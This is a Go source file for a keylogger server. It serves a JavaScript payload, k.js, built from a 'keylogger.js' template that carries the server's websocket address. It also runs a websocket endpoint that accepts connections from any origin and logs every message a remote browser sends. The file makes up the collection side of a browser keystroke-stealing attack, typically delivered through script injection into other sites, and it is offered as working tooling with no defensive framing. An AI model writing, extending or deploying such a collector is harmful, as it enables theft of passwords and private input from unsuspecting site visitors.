package main

import (
	"fmt"
	"html/template"
	"log"
	"net/http"

	"github.com/gorilla/mux"
	"github.com/gorilla/websocket"
)

func main() {
	runKeyLogServer()
}

var upgrader = websocket.Upgrader{
	CheckOrigin: func(r *http.Request) bool { return true },
}

var (
	// listenAddr string
	wsAddr     string
	jsTemplate *template.Template
	err        error
)

func init() {
	// flag.StringVar(&listenAddr, "listen-addr", "3333", "Address to listen")
	// flag.StringVar(&wsAddr, "ws-addr", "", "Address  for websocket connection")
	// flag.Parse()

	wsAddr = "localhost:4445"

	jsTemplate, err = template.ParseFiles("keylogger.js")
	if err != nil {
		panic(err)
	}

}

func serveWs(w http.ResponseWriter, r *http.Request) {

	con, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		http.Error(w, "", 500)
		return
	}

	defer con.Close()

	fmt.Printf("Connection from remote %s\n", con.RemoteAddr().String())

	for {
		msgType, msg, err := con.ReadMessage()
		if err != nil {
			fmt.Print(err)
			return
		}
		fmt.Printf("Message type: %d", msgType)
		fmt.Printf("From %s: %s,\n", con.RemoteAddr().String(), string(msg))

	}

}

func serveFile(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/javascript")
	jsTemplate.Execute(w, wsAddr)
}

func runKeyLogServer() {
	r := mux.NewRouter()

	r.HandleFunc("/ws", serveWs)
	r.HandleFunc("/k.js", serveFile)

	log.Fatal(http.ListenAndServe(":4445", r))

}
